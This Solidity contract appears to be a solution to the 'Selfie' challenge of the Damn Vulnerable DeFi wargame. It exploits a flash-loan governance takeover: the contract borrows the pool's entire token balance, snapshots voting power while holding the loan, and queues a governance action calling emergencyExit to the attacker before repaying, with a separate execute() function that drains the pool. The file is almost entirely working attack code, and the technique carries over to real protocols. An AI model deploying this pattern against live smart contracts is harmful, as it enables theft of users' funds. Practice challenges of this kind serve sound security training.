// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "../DamnValuableTokenSnapshot.sol";



contract SelfieAttacker is IERC3156FlashBorrower {
    address immutable owner;

    SelfiePool immutable selfiePool;

    SimpleGovernance immutable simpleGoverance;

    DamnValuableTokenSnapshot immutable token;

    constructor(
        address _selfiePool,
        address _simpleGov,
        address _token
    ) {
        owner = msg.sender;
        selfiePool = SelfiePool(_selfiePool);
        simpleGoverance = SimpleGovernance(_simpleGov);
        token = DamnValuableTokenSnapshot(_token);
    }

    function exploit() external {
        selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            ERC20Snapshot(selfiePool.token()).balanceOf(address(selfiePool)),
            abi.encodeWithSignature("emergencyExit(address)", msg.sender)
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
         require(
            token.balanceOf(address(this)) == 1500000 ether,
            "Didn't get loan."
        );
        uint256 id = token.snapshot();
        require(id == 2, "Didn't create snapshot.");
        simpleGoverance.queueAction(address(selfiePool), 0, data);
        uint count = simpleGoverance.getActionCounter();
        require(count == 2, "Action not queued");
        token.approve(address(selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() public {
        simpleGoverance.executeAction(1);
    }
}